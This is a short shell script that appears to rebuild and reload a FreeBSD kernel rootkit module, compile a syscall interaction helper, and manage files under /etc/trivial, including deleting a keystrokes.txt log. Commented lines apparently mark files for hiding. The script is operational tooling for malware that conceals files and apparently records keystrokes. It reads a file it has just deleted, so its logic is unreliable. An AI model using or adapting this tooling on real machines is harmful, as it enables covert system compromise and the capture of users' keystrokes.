#!/bin/sh
clear
cd ../interact/
cc syscall.c -o syscall
./setflags /etc/trivial/syscall_number.txt ff
rm /etc/trivial/syscall_number.txt
rm /etc/trivial/keystrokes.txt
sys_num=$(cat /etc/trivial/syscall_number.txt)
#./syscall $sys_num 0

cd ../rootkit

kldunload ./rootkit.ko
make clean
make
kldload ./rootkit.ko

cd ../interact/
cc syscall.c -o syscall

# ./add.sh syscall_number.txt
# ./setflags.sh syscall_number.txt 01
# ./add.sh trivial
# ./setflags.sh trivial 01
# ./add.sh keystrokes.txt
# ./setflags.sh keystrokes.txt 01